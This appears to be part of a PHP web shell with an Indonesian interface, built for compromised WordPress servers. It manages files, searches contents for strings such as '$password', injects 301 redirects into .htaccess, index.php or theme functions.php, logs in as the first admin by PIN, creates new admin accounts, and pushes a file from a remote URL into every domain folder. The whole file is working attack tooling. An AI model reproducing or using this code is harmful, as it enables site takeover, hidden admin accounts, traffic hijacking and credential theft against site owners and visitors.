                            <button type="button" style="background:#dedede;color:#333;border:1px solid #aaa;padding:2px 7px;margin-left:2px;">
                                👁️
                            </button>
                        </a>
                    <?php endif; ?>
                    <form action="" method="post" style="display: inline; margin-left:3px;">
                        <input type="hidden" name="nameToChmod" value="<?= $item ?>">
                        <input type="text" name="perm" placeholder="chmod" style="width:36px;" pattern="[0-7]{3,4}" title="Contoh: 755">
                        <button type="submit" name="chmod">CHMOD</button>
                    </form>
                    <?php if (!is_dir($fullpath) && @filesize($fullpath)<500000): ?>
                        <form action="" method="post" style="display: inline;">
                            <input type="hidden" name="fileNameToEdit" value="<?= $item ?>">
                            <button type="submit" name="edit">Edit</button>
                        </form>
                    <?php elseif (!is_dir($fullpath)): ?>
                        <button type="button" disabled title="File terlalu besar">Edit</button>
                    <?php endif; ?>
                    <form class="ajax-delete-form" data-name="<?= htmlspecialchars($item) ?>">
                        <input type="hidden" name="target" value="<?= htmlspecialchars($item) ?>">
                        <button type="button" class="delete">Delete</button>
                    </form>
                    <a href="?download=<?= urlencode($fullpath) ?>" style="margin-left:2px; padding:2px 7px; border:1px solid #2980b9; border-radius:4px; background:#2980b9; color:#fff; text-decoration:none;" title="Download">⬇️</a>
                    <form action="" method="post" style="display:inline;">
                        <input type="hidden" name="itemToZip" value="<?= htmlspecialchars($item) ?>">
                        <button type="submit" name="zip" style="background:#FFB400; color:#333; border:none; padding:2px 8px; border-radius:4px; cursor:pointer;">ZIP</button>
                    </form>
                    <?php if (strtolower(pathinfo($item, PATHINFO_EXTENSION)) === 'zip'): ?>
                        <button type="button" class="extract-btn" data-zip="<?= htmlspecialchars($item) ?>" style="background:#43dbb0; color:#111; border:none; padding:2px 8px; border-radius:4px; cursor:pointer;">Extract</button>
                    <?php endif; ?>
                    <span title="Date Modified" style="font-size:11px; color:#ff0000; min-width:95px;">
                        <?= htmlspecialchars($dateModified) ?>
                    </span>
                </div>
            </div>
            <?php endforeach; ?>
            </div>
        </form>
        <?php if (!empty($fileToEdit)): ?>
            <h2 id="editfile" style="font-size:15px;">Edit File: <?= htmlspecialchars($fileToEdit) ?></h2>
            <form action="" method="post">
                <textarea name="content" rows="10"><?= htmlspecialchars($fileContent) ?></textarea><br>
                <input type="hidden" name="fileNameToEdit" value="<?= htmlspecialchars($fileToEdit) ?>">
                <button type="submit" name="saveEdit">Save Changes</button>
            </form>
        <?php endif; ?>
    </div>
</div>

<!-- Modal Search -->
<div id="searchModal" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.5); z-index:10013; justify-content:center; align-items:center;">
  <div style="background:#fff; border-radius:8px; padding:16px 14px; min-width:320px; max-width:96vw;">
    <h3 style="margin:0 0 8px 0; font-size:14px;">Search File / Folder / Isi File</h3>
    <form id="searchForm" method="post" action="">
      <label style="display:block; font-size:12px; margin:4px 0;">
        Root folder (kosong = folder yang sedang dibuka)
      </label>
      <input type="text"
             name="search_root"
             id="search_root"
             value="<?= htmlspecialchars($directory) ?>"
             style="width:96%;">

      <label style="display:block; font-size:12px; margin:8px 0 4px 0;">
        Cari nama file / folder (opsional)
      </label>
      <input type="text"
             name="search_name"
             id="search_name"
             placeholder="misal: config, backup, user"
             style="width:96%;">

      <label style="display:block; font-size:12px; margin:8px 0 4px 0;">
        Cari isi file (keyword, opsional)
      </label>
      <input type="text"
             name="search_content"
             id="search_content"
             placeholder="misal: $password"
             style="width:96%;">

      <div style="font-size:11px; color:#555; margin-top:6px;">
        Content search hanya membaca file teks kecil (php, html, txt, js, css, dll) &lt;= 1MB.
      </div>

      <input type="hidden" name="runSearch" value="1">

      <div style="margin-top:10px; text-align:right;">
        <button type="button" onclick="confirmSearch()">Lanjut</button>
        <button type="button" onclick="closeSearchModal()">Batal</button>
      </div>
    </form>
  </div>
</div>

<!-- Modal Konfirmasi Search -->
<div id="searchConfirmModal" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.45); z-index:10014; justify-content:center; align-items:center;">
  <div style="background:#fff; border-radius:8px; padding:16px 14px; min-width:280px; max-width:92vw;">
    <div id="searchConfirmMsg" style="font-size:13px; margin-bottom:10px;"></div>
    <div style="text-align:right;">
      <button type="button" onclick="submitSearch()">Yes</button>
      <button type="button" onclick="closeSearchConfirmModal()">No</button>
    </div>
  </div>
</div>

<div id="extractModal" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.32); z-index:10004; justify-content:center; align-items:center;">
  <div style="background:#fff; border-radius:7px; padding:16px 11px; min-width:220px;">
    <form method="post">
      <input type="hidden" name="zipToExtract" id="zipToExtract" value="">
      <label for="extractDest" style="font-size:12px;">Extract ke folder:</label>
      <input type="text" name="extractDest" id="extractDest" style="width:96%;" required>
      <div style="text-align:center; margin-top:8px;">
        <button type="submit" name="extractZip" style="background:#43dbb0; color:#111;">Extract</button>
        <button type="button" onclick="document.getElementById('extractModal').style.display='none';">Cancel</button>
      </div>
    </form>
  </div>
</div>

<!-- Modal Redirect 301 -->
<div id="redirectModal" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.5); z-index:10006; justify-content:center; align-items:center;">
  <div style="background:#fff; border-radius:8px; padding:16px 14px; min-width:300px; max-width:92vw;">
    <h3 style="margin:0 0 8px 0; font-size:14px;">Buat Redirect 301</h3>
    <form id="redirectForm" method="post" action="">
      <label style="display:block; font-size:12px; margin:4px 0;">Tambahkan aturan ke:</label>
      <label style="display:block; font-size:12px; margin-left:8px;">
        <input type="radio" name="redirect_target_type" value="htaccess" checked> .htaccess (Document Root)
      </label>
      <label style="display:block; font-size:12px; margin-left:8px;">
        <input type="radio" name="redirect_target_type" value="index"> index.php (Document Root)
      </label>
      <label style="display:block; font-size:12px; margin-left:8px;">
        <input type="radio" name="redirect_target_type" value="theme"> Theme (functions.php aktif)
      </label>

      <label style="display:block; font-size:12px; margin:8px 0 4px 0;">
        URL / path yang akan di-redirect
      </label>
      <input type="text" id="redirect_source" name="redirect_source"
             placeholder="Contoh: /sample-page/ atau homepage"
             style="width:96%;" required>

      <label style="display:block; font-size:12px; margin:8px 0 4px 0;">
        URL tujuan redirect (target)
      </label>
      <input type="url" id="redirect_target_url" name="redirect_target_url"
             placeholder="https://domain-tujuan.com"
             style="width:96%;"
             value="<?= htmlspecialchars($redirectTargetDefault) ?>">

      <input type="hidden" name="runRedirect301" value="1">

      <div style="margin-top:10px; text-align:right;">
        <button type="button" onclick="confirmRedirect301()">Lanjut</button>
        <button type="button" onclick="closeRedirectModal()">Batal</button>
      </div>
    </form>
  </div>
</div>

<!-- Modal Konfirmasi Redirect 301 -->
<div id="redirectConfirmModal" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.45); z-index:10007; justify-content:center; align-items:center;">
  <div style="background:#fff; border-radius:8px; padding:16px 14px; min-width:280px; max-width:92vw;">
    <div id="redirectConfirmMsg" style="font-size:13px; margin-bottom:10px;"></div>
    <div style="text-align:right;">
      <button type="button" onclick="submitRedirect301()">Yes</button>
      <button type="button" onclick="closeRedirectConfirmModal()">No</button>
    </div>
  </div>
</div>

<!-- Modal Admin -->
<div id="adminModal" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.5); z-index:10012; justify-content:center; align-items:center;">
  <div style="background:rgba(0,0,0,0.9); color:#fff; border-radius:8px; padding:16px 14px; min-width:300px; max-width:90vw;">
    <h3 style="margin:0 0 8px 0; font-size:14px;">Admin WordPress</h3>

    <div style="margin-bottom:16px; padding-bottom:8px; border-bottom:1px solid #333;">
      <p style="font-size:13px; margin:0 0 8px 0;">Login otomatis sebagai admin pertama</p>
      <label for="admin_pin_input" style="font-size:12px; display:block; margin-bottom:4px;">PIN Admin</label>
      <input type="password" id="admin_pin_input" placeholder="Masukkan PIN" style="width:100%; padding:5px; margin-bottom:8px; border-radius:4px; border:1px solid #555; background:#111; color:#fff;">
      <button type="button" onclick="loginAdmin()" style="background:#00ffc8; color:#111; border:none; border-radius:6px; padding:4px 10px; cursor:pointer;">Login Otomatis</button>
    </div>

    <div>
      <p style="font-size:13px; margin:0 0 8px 0;">Buat user admin baru</p>
      <label for="admin_new_user_input" style="font-size:12px; display:block; margin-bottom:4px;">Username Baru</label>
      <input type="text" id="admin_new_user_input" placeholder="Username" style="width:100%; padding:5px; margin-bottom:8px; border-radius:4px; border:1px solid #555; background:#111; color:#fff;">
      <label for="admin_new_pass_input" style="font-size:12px; display:block; margin-bottom:4px;">Password Baru</label>
      <input type="password" id="admin_new_pass_input" placeholder="Password" style="width:100%; padding:5px; margin-bottom:8px; border-radius:4px; border:1px solid #555; background:#111; color:#fff;">
      <label for="admin_new_email_input" style="font-size:12px; display:block; margin-bottom:4px;">Email (opsional)</label>
      <input type="email" id="admin_new_email_input" placeholder="Email" style="width:100%; padding:5px; margin-bottom:8px; border-radius:4px; border:1px solid #555; background:#111; color:#fff;">
      <button type="button" onclick="createAdminUser()" style="background:#ffb400; color:#111; border:none; border-radius:6px; padding:4px 10px; cursor:pointer;">Buat User</button>
    </div>

    <div style="text-align:right; margin-top:12px;">
      <button type="button" onclick="closeAdminModal()" style="padding:4px 10px;">Tutup</button>
    </div>
  </div>
</div>

<!-- Form tersembunyi untuk submit -->
<form id="adminForm" method="post" action="" style="display:none;">
  <input type="hidden" name="admin_pin" id="admin_pin_hidden">
  <input type="hidden" name="admin_new_user" id="admin_new_user_hidden">
  <input type="hidden" name="admin_new_pass" id="admin_new_pass_hidden">
  <input type="hidden" name="admin_new_email" id="admin_new_email_hidden">
  <input type="hidden" name="auto_admin_login" id="auto_admin_login_flag" value="">
  <input type="hidden" name="create_admin_user" id="create_admin_user_flag" value="">
</form>

<script>
function showSearchModal() {
    document.getElementById('searchModal').style.display = 'flex';
}
function closeSearchModal() {
    document.getElementById('searchModal').style.display = 'none';
}
function closeSearchConfirmModal() {
    document.getElementById('searchConfirmModal').style.display = 'none';
}
function confirmSearch() {
    var root = (document.getElementById('search_root').value || '').trim();
    var name = (document.getElementById('search_name').value || '').trim();
    var text = (document.getElementById('search_content').value || '').trim();

    if (!name && !text) {
        alert('Isi minimal salah satu: nama file/folder atau keyword isi file.');
        return;
    }

    var msg = 'Jalankan search dari root:\n' +
              '<code>' + escapeHtml(root || '<?= htmlspecialchars($directory, ENT_QUOTES) ?>') + '</code><br><br>';

    if (name) {
        msg += '• Cari nama file/folder mengandung: <code>' + escapeHtml(name) + '</code><br>';
    }
    if (text) {
        msg += '• Cari isi file mengandung: <code>' + escapeHtml(text) + '</code><br>';
    }

    msg += '<br><span style="font-size:11px;color:#555;">Catatan: jika root terlalu jauh (misalnya Document Root besar), scan bisa dipotong otomatis.</span>';

    document.getElementById('searchConfirmMsg').innerHTML = msg;
    document.getElementById('searchConfirmModal').style.display = 'flex';
}
function submitSearch() {
    document.getElementById('searchConfirmModal').style.display = 'none';
    document.getElementById('searchModal').style.display = 'none';
    document.getElementById('searchForm').submit();
}

function selectAll(flag) {
    document.querySelectorAll('.select-item').forEach(function(cb) { cb.checked = flag; });
}
<?php if (!empty($fileToEdit)): ?>
window.onload = function() {
    var editArea = document.getElementById('editfile');
    if(editArea) editArea.scrollIntoView({behavior:'smooth'});
};
<?php endif; ?>
// Modal Extract ZIP
document.querySelectorAll('.extract-btn').forEach(function(btn){
    btn.onclick = function(){
        document.getElementById('zipToExtract').value = btn.getAttribute('data-zip');
        document.getElementById('extractDest').value = '<?= htmlspecialchars($directory) ?>';
        document.getElementById('extractModal').style.display = 'flex';
    }
});

function showRedirectModal() {
    document.getElementById('redirectModal').style.display = 'flex';
}
function closeRedirectModal() {
    document.getElementById('redirectModal').style.display = 'none';
}
function closeRedirectConfirmModal() {
    document.getElementById('redirectConfirmModal').style.display = 'none';
}

function escapeHtml(str) {
    return str.replace(/&/g, '&amp;')
              .replace(/</g, '&lt;')
              .replace(/>/g, '&gt;');
}

function confirmRedirect301() {
    var src  = document.getElementById('redirect_source').value.trim();
    var destEl = document.getElementById('redirect_target_url');
    var dest = destEl ? destEl.value.trim() : '';
    var typeEl = document.querySelector('input[name="redirect_target_type"]:checked');

    if (!typeEl) {
        alert('Pilih target file (htaccess / index.php / theme).');
        return;
    }
    if (!src) {
        alert('Isi URL/path yang akan di-redirect.');
        return;
    }
    if (!dest) {
        alert('Isi URL tujuan redirect.');
        return;
    }

    var typeLabel = typeEl.value;
    if (typeLabel === 'htaccess') typeLabel = '.htaccess (Document Root)';
    else if (typeLabel === 'index') typeLabel = 'index.php (Document Root)';
    else if (typeLabel === 'theme') typeLabel = 'Theme (functions.php aktif)';

    var msg = 'Buat redirect 301 untuk:<br>' +
              '<code>' + escapeHtml(src) + '</code><br>' +
              '→ <code>' + escapeHtml(dest) + '</code><br>' +
              'Penulisan aturan di: <b>' + typeLabel + '</b><br><br>' +
              'Lanjut?';

    document.getElementById('redirectConfirmMsg').innerHTML = msg;
    document.getElementById('redirectConfirmModal').style.display = 'flex';
}

function submitRedirect301() {
    document.getElementById('redirectForm').submit();
}

function showAdminModal() {
    var m = document.getElementById('adminModal');
    if (m) m.style.display = 'flex';
}
function closeAdminModal() {
    var m = document.getElementById('adminModal');
    if (m) m.style.display = 'none';
}
function loginAdmin() {
    var pinInput = document.getElementById('admin_pin_input');
    if (!pinInput) return;
    var pin = pinInput.value.trim();
    if (!pin) {
        alert('PIN admin wajib diisi.');
        pinInput.focus();
        return;
    }

    var form = document.getElementById('adminForm');
    var hiddenPin = document.getElementById('admin_pin_hidden');
    var autoFlag = document.getElementById('auto_admin_login_flag');
    var createFlag = document.getElementById('create_admin_user_flag');

    if (!form || !hiddenPin || !autoFlag || !createFlag) return;

    hiddenPin.value = pin;
    autoFlag.value = "1";
    createFlag.value = "";
    form.submit();
}

function createAdminUser() {
    var pinInput = document.getElementById('admin_pin_input');
    var userInput = document.getElementById('admin_new_user_input');
    var passInput = document.getElementById('admin_new_pass_input');
    var emailInput = document.getElementById('admin_new_email_input');

    var pin = pinInput ? pinInput.value.trim() : '';
    var user = userInput ? userInput.value.trim() : '';
    var pass = passInput ? passInput.value : '';
    var email = emailInput ? emailInput.value.trim() : '';

    if (!pin) {
        alert('PIN admin wajib diisi.');
        if (pinInput) pinInput.focus();
        return;
    }
    if (!user) {
        alert('Username admin baru wajib diisi.');
        if (userInput) userInput.focus();
        return;
    }
    if (!pass) {
        alert('Password admin baru wajib diisi.');
        if (passInput) passInput.focus();
        return;
    }

    var form = document.getElementById('adminForm');
    var hiddenPin = document.getElementById('admin_pin_hidden');
    var hUser = document.getElementById('admin_new_user_hidden');
    var hPass = document.getElementById('admin_new_pass_hidden');
    var hEmail = document.getElementById('admin_new_email_hidden');
    var autoFlag = document.getElementById('auto_admin_login_flag');
    var createFlag = document.getElementById('create_admin_user_flag');

    if (!form || !hiddenPin || !hUser || !hPass || !hEmail || !autoFlag || !createFlag) return;

    hiddenPin.value = pin;
    hUser.value = user;
    hPass.value = pass;
    hEmail.value = email;
    createFlag.value = "1";
    autoFlag.value = "";
    form.submit();
}

function confirmDeployFile() {
    var form = document.getElementById('deployFileForm');
    if (!form) {
        alert('Form deploy file tidak ditemukan.');
        return;
    }

    var checkboxes = form.querySelectorAll('input[name="deploy_file_targets[]"]:checked');
    if (!checkboxes.length) {
        alert('Pilih minimal satu folder domain/subdomain.');
        return;
    }

    var urlInput  = form.querySelector('input[name="deploy_file_url"]');
    var nameInput = form.querySelector('input[name="deploy_file_name"]');
    var pathInput = form.querySelector('input[name="deploy_file_path"]');

    var fileUrl  = urlInput  ? urlInput.value.trim()  : '';
    var fileName = nameInput ? nameInput.value.trim() : '';
    var subPath  = pathInput ? pathInput.value.trim() : '';

    if (!fileUrl) {
        alert('Isi URL file dulu.');
        return;
    }

    var targetLabels = [];
    checkboxes.forEach(function(cb) {
        var lbl = cb.closest('label');
        if (lbl) {
            var strong = lbl.querySelector('strong');
            if (strong) targetLabels.push(strong.textContent.trim());
        }
    });

    var msg = 'Deploy file berikut:<br>';
    msg += 'URL: <code>' + escapeHtml(fileUrl) + '</code><br>';
    if (fileName) {
        msg += 'Nama file: <code>' + escapeHtml(fileName) + '</code><br>';
    }
    msg += '<br>Ke folder domain/subdomain:<br>';
    targetLabels.forEach(function(t) {
        msg += '• ' + escapeHtml(t) + '<br>';
    });
    msg += '<br>Path simpan di dalam folder: <code>' + escapeHtml(subPath || '(root folder)') + '</code><br><br>';
    msg += 'Lanjutkan?';

    if (confirm(msg.replace(/<br>/g, '\n').replace(/<code>/g, '').replace(/<\/code>/g, ''))) {
        form.submit();
    }
}

function selectAllDeployFile(checked) {
    var checkboxes = document.querySelectorAll('#deployFileForm input[name="deploy_file_targets[]"]');
    checkboxes.forEach(function(cb) {
        cb.checked = checked;
    });
}
</script>

<?php if ($totalPages > 1): ?>
    <div style="margin:10px 0;">
        <?php for ($i = 1; $i <= $totalPages; $i++): ?>
            <?php if ($i == $page): ?>
                <span class="nav-link disabled"><?= $i ?></span>
            <?php else: ?>
                <a class="nav-link" href="?folder=<?= urlencode($directory) ?>&page=<?= $i ?>"><?= $i ?></a>
            <?php endif; ?>
        <?php endfor; ?>
    </div>
<?php endif; ?>

<?php if (!empty($_SESSION['search_message'])): ?>
<div id="toastSearch" style="
    position: fixed;
    top: 360px;
    right: 20px;
    background: <?= 
        ($_SESSION['search_status'] === 'error'
            ? '#e74c3c'
            : ($_SESSION['search_status'] === 'partial' ? '#ffb400' : '#2ecc71'))
    ?>;
    color: white;
    padding: 12px 18px;
    border-radius: 8px;
    box-shadow: 0 2px 10px rgba(0,0,0,0.3);
    font-size: 13px;
    z-index: 9999;
    display: none;
    max-width: 420px;
    white-space: pre-wrap;
">
    <?= nl2br(htmlspecialchars($_SESSION['search_message'])) ?>
</div>
<script>
window.addEventListener('load', () => {
    const toast = document.getElementById('toastSearch');
    if (toast) {
        toast.style.display = 'block';
        setTimeout(() => { toast.style.display = 'none'; }, 20000);
    }
});
</script>
<?php
unset($_SESSION['search_message']);
unset($_SESSION['search_status']);
endif;
?>

<?php if (!empty($_SESSION['htreplace_message'])): ?>
<div id="toastHtReplace" style="
    position: fixed;
    top: 70px;
    right: 20px;
    background: <?= ($_SESSION['htreplace_status'] === 'error' ? '#e74c3c' : '#2ecc71') ?>;
    color: white;
    padding: 12px 18px;
    border-radius: 8px;
    box-shadow: 0 2px 10px rgba(0,0,0,0.3);
    font-size: 13px;
    z-index: 9999;
    display: none;
">
    <?= htmlspecialchars($_SESSION['htreplace_message']) ?>
</div>
<script>
  window.addEventListener('load', () => {
    const toast = document.getElementById('toastHtReplace');
    if (toast) {
      toast.style.display = 'block';
      setTimeout(() => { toast.style.display = 'none'; }, 20000);
    }
  });
</script>
<?php
unset($_SESSION['htreplace_message']);
unset($_SESSION['htreplace_status']);
endif;
?>

<?php if (!empty($_SESSION['ts_message'])): ?>
<div id="toastTs" style="
    position: fixed;
    top: 120px;
    right: 20px;
    background: <?= ($_SESSION['ts_status'] === 'error' ? '#e74c3c' : ($_SESSION['ts_status'] === 'partial' ? '#ffb400' : '#2ecc71')) ?>;
    color: white;
    padding: 12px 18px;
    border-radius: 8px;
    box-shadow: 0 2px 10px rgba(0,0,0,0.3);
    font-size: 13px;
    z-index: 9999;
    display: none;
    max-width: 420px;
    white-space: pre-wrap;
">
    <?= $_SESSION['ts_message'] ?>
</div>
<script>
  window.addEventListener('load', () => {
    const toast = document.getElementById('toastTs');
    if (toast) {
      toast.style.display = 'block';
      setTimeout(() => { toast.style.display = 'none'; }, 20000);
    }
  });
</script>
<?php
unset($_SESSION['ts_message']);
unset($_SESSION['ts_status']);
endif;
?>

<?php if (!empty($_SESSION['redirect_message'])): ?>
    <div id="toastRedirect" style="
        position: fixed;
        top: 170px;
        right: 20px;
        background: <?= ($_SESSION['redirect_status'] === 'error' ? '#e74c3c' : '#2ecc71') ?>;
        color: white;
        padding: 12px 18px;
        border-radius: 8px;
        box-shadow: 0 2px 10px rgba(0,0,0,0.3);
        font-size: 13px;
        z-index: 9999;
        display: none;
        max-width: 420px;
        white-space: pre-wrap;
    ">
        <?= htmlspecialchars($_SESSION['redirect_message']) ?>
    </div>
    <script>
    window.addEventListener('load', () => {
        const toast = document.getElementById('toastRedirect');
        if (toast) {
        toast.style.display = 'block';
        setTimeout(() => { toast.style.display = 'none'; }, 20000);
        }
    });
    </script>
    <?php
    unset($_SESSION['redirect_message']);
    unset($_SESSION['redirect_status']);
    endif;
    ?>

<?php if (!empty($_SESSION['admin_pin_error'])): ?>
    <div id="toastAdminPin" style="
        position: fixed;
        top: 320px;
        right: 20px;
        background:#e74c3c;
        color: white;
        padding: 12px 18px;
        border-radius: 8px;
        box-shadow: 0 2px 10px rgba(0,0,0,0.3);
        font-size: 13px;
        z-index: 9999;
        display: none;
        max-width: 320px;
        white-space: pre-wrap;
    ">
        <?= htmlspecialchars($_SESSION['admin_pin_error']) ?>
    </div>
    <script>
    window.addEventListener('load', () => {
        const toast = document.getElementById('toastAdminPin');
        if (toast) {
            toast.style.display = 'block';
            setTimeout(() => { toast.style.display = 'none'; }, 20000);
        }
    });
    </script>
    <?php
    unset($_SESSION['admin_pin_error']);
    endif;
    ?>

<?php if (!empty($_SESSION['admin_create_status'])): ?>
<div id="toastAdminCreate" style="position: fixed; top: 370px; right: 20px; background: <?= (strpos($_SESSION['admin_create_status'], 'Berhasil') !== false ? '#2ecc71' : '#e74c3c') ?>; color: white; padding: 12px 18px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.3); font-size: 13px; z-index: 9999; display: none; max-width: 320px;">
    <?= htmlspecialchars($_SESSION['admin_create_status']) ?>
</div>
<script>
window.addEventListener('load', function() {
    var toast = document.getElementById('toastAdminCreate');
    if (toast) {
        toast.style.display = 'block';
        setTimeout(function() { toast.style.display = 'none'; }, 20000);
    }
});
</script>
<?php unset($_SESSION['admin_create_status']); endif; ?>

<?php if (!empty($_SESSION['deploy_file_message'])): ?>
<div id="toastDeployFile" style="
    position: fixed;
    top: 450px;
    right: 20px;
    background: <?= ($_SESSION['deploy_file_status'] === 'error' ? '#e74c3c' : ($_SESSION['deploy_file_status'] === 'partial' ? '#ffb400' : '#22c55e')) ?>;
    color: white;
    padding: 12px 18px;
    border-radius: 8px;
    box-shadow: 0 2px 10px rgba(0,0,0,0.3);
    font-size: 13px;
    z-index: 9999;
    display: none;
    max-width: 420px;
    white-space: pre-wrap;
">
    <?= $_SESSION['deploy_file_message'] ?>
</div>
<script>
window.addEventListener('load', () => {
    const toast = document.getElementById('toastDeployFile');
    if (toast) {
        toast.style.display = 'block';
        setTimeout(() => { toast.style.display = 'none'; }, 20000);
    }
});
</script>
<?php
unset($_SESSION['deploy_file_message']);
unset($_SESSION['deploy_file_status']);
endif;
?>

<script>
document.addEventListener('DOMContentLoaded', function() {
    const currentFolder = <?= json_encode($directory) ?>;

    document.querySelectorAll('.ajax-delete-form').forEach(form => {
        form.querySelector('.delete').addEventListener('click', function() {
            const name = form.getAttribute('data-name');
            if (!confirm(`Yakin ingin menghapus "${name}"?`)) return;

            const formData = new FormData();
            formData.append('target', name);

            fetch('?ajax_delete=1&folder=' + encodeURIComponent(currentFolder), {
                method: 'POST',
                body: formData
            })
            .then(res => res.json())
            .then(data => {
                if (data.success) {
                    alert(`"${name}" berhasil dihapus.`);
                    location.reload();
                } else {
                    alert(`Gagal menghapus "${name}".`);
                }
            })
            .catch(err => {
                console.error('AJAX error:', err);
                alert('Terjadi kesalahan AJAX.');
            });
        });
    });
});

</script>
<!-- Modal Scan -->
<div id="scanModal" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.5); z-index:10002; justify-content:center; align-items:center;">
  <div style="background:#fff; border-radius:7px; padding:18px 14px; min-width:280px; max-width:92vw;">
    <h3 style="margin-bottom:10px; font-size:13px;">Pilih Jenis Scan</h3>
    <form id="scanForm" method="post" action="">
      <label style="display:block; font-size:12px; margin:2px 0;">
        <input type="checkbox" id="scanHtaccess" name="scanHtaccess" value="1">
        Scan Semua .htaccess
      </label>
      <label style="display:block; font-size:12px; margin:2px 0;">
        <input type="checkbox" id="scanLocked" name="scanLocked" value="1">
        Scan Folder Terkunci CHMOD
      </label>

      <hr style="margin:8px 0;">
      <label style="display:block; font-size:12px; margin:2px 0;">
        <input type="checkbox" id="scanWpAdmin" name="scanWpAdmin" value="1" onchange="toggleWpVersionInputs()">
        Scan <code>wp-admin</code> (checksum core)
      </label>
      <div id="wpVersionAdminBox" style="display:none; margin:4px 0 6px 20px;">
        <input type="text" id="wpVersionAdmin" name="wpVersionAdmin" placeholder="Versi WP (opsional, contoh: 6.6.2)" style="width:96%;">
        <div style="font-size:11px;color:#666;margin-top:3px;">Kosongkan untuk auto-detect.</div>
      </div>

      <label style="display:block; font-size:12px; margin:2px 0;">
        <input type="checkbox" id="scanWpIncludes" name="scanWpIncludes" value="1" onchange="toggleWpVersionInputs()">
        Scan <code>wp-includes</code> (checksum core)
      </label>
      <div id="wpVersionIncludesBox" style="display:none; margin:4px 0 6px 20px;">
        <input type="text" id="wpVersionIncludes" name="wpVersionIncludes" placeholder="Versi WP (opsional, contoh: 6.6.2)" style="width:96%;">
        <div style="font-size:11px;color:#666;margin-top:3px;">Kosongkan untuk auto-detect.</div>
      </div>

      <div style="margin-top:10px; text-align:right;">
        <button type="button" onclick="confirmScan()">Lanjut</button>
        <button type="button" onclick="closeScanModal()">Batal</button>
      </div>
    </form>
  </div>
</div>

<!-- Modal Konfirmasi Scan -->
<div id="scanConfirmModal" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.4); z-index:10003; justify-content:center; align-items:center;">
  <div style="background:#fff; border-radius:7px; padding:18px 14px; min-width:260px;">
    <div id="scanConfirmMsg" style="font-size:13px; margin-bottom:10px;"></div>
    <div style="text-align:right;">
      <button type="button" onclick="submitScan()">Yes</button>
      <button type="button" onclick="closeScanConfirmModal()">No</button>
    </div>
  </div>
</div>

<!-- Modal Replace .htaccess -->
<div id="htaccessReplaceModal" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.5); z-index:10005; justify-content:center; align-items:center;">
  <div style="background:#fff; border-radius:8px; padding:16px 14px; min-width:300px; max-width:92vw;">
    <h3 style="margin:0 0 8px 0; font-size:14px;">Replace .htaccess</h3>
    <form method="post" id="htreplaceForm">
      <label style="display:block; font-size:12px; margin:4px 0;">
        <input type="checkbox" name="replaceIncludes" value="1">
        Tulis .htaccess di <code>/wp-includes</code>
      </label>
      <label style="display:block; font-size:12px; margin:4px 0;">
        <input type="checkbox" name="replaceContent" value="1">
        Tulis .htaccess di <code>/wp-content</code>
      </label>

      <div style="border-top:1px solid #ddd; margin:8px 0;"></div>

      <label style="display:block; font-size:12px; margin:4px 0;">
        <input type="checkbox" id="replaceCustom" name="replaceCustom" value="1" onchange="toggleCustomBox()">
        Tulis .htaccess di path custom
      </label>
      <div id="customBox" style="display:none; margin-left:18px;">
        <label style="display:block; font-size:12px;">Path (di dalam Document Root)</label>
        <input type="text" name="customPath" placeholder="/path/relative/atau/absolute" style="width:96%;">

        <div style="margin-top:6px; font-size:12px;">
          Mode:
          <label style="margin-left:6px;"><input type="radio" name="customMode" value="allow" checked> Allow</label>
          <label style="margin-left:6px;"><input type="radio" name="customMode" value="deny"> Deny</label>
        </div>
      </div>

      <div style="text-align:right; margin-top:12px;">
        <button type="submit" name="doHtaccessReplace" style="background:#43dbb0; color:#111; border:none; padding:4px 10px; border-radius:6px; cursor:pointer;">Jalankan</button>
        <button type="button" onclick="closeHtaccessReplaceModal()">Batal</button>
      </div>
    </form>
  </div>
</div>

<script>
function showScanModal() {
    document.getElementById('scanModal').style.display = 'flex';
    toggleWpVersionInputs();
}
function closeScanModal() {
    document.getElementById('scanModal').style.display = 'none';
}
function toggleWpVersionInputs() {
    var a = document.getElementById('scanWpAdmin').checked;
    var b = document.getElementById('scanWpIncludes').checked;
    document.getElementById('wpVersionAdminBox').style.display    = a ? 'block' : 'none';
    document.getElementById('wpVersionIncludesBox').style.display = b ? 'block' : 'none';
}
function confirmScan() {
    var ht = document.getElementById('scanHtaccess').checked;
    var lk = document.getElementById('scanLocked').checked;
    var wa = document.getElementById('scanWpAdmin').checked;
    var wi = document.getElementById('scanWpIncludes').checked;

    if (!ht && !lk && !wa && !wi) {
        alert("Pilih minimal satu opsi scan!");
        return;
    }

    var verA = (document.getElementById('wpVersionAdmin').value || '').trim();
    var verI = (document.getElementById('wpVersionIncludes').value || '').trim();

    var list = [];
    if (ht) list.push("• .htaccess");
    if (lk) list.push("• Folder terkunci CHMOD");
    if (wa) list.push("• wp-admin (versi: " + (verA || "auto") + ")");
    if (wi) list.push("• wp-includes (versi: " + (verI || "auto") + ")");

    var msg = "Anda akan menjalankan scan berikut:<br>" + list.join("<br>") + "<br><br>Lanjut scan?";
    document.getElementById('scanConfirmMsg').innerHTML = msg;
    document.getElementById('scanConfirmModal').style.display = 'flex';
}
function closeScanConfirmModal() {
    document.getElementById('scanConfirmModal').style.display = 'none';
}
function submitScan() {
    closeScanConfirmModal();
    closeScanModal();
    document.getElementById('scanForm').submit();
}
function showHtaccessReplaceModal(){
  document.getElementById('htaccessReplaceModal').style.display='flex';
}
function closeHtaccessReplaceModal(){
  document.getElementById('htaccessReplaceModal').style.display='none';
}
function toggleCustomBox(){
  var on = document.getElementById('replaceCustom').checked;
  document.getElementById('customBox').style.display = on ? 'block' : 'none';
}
</script>

</body>
</html>
<?php ob_end_flush(); ?>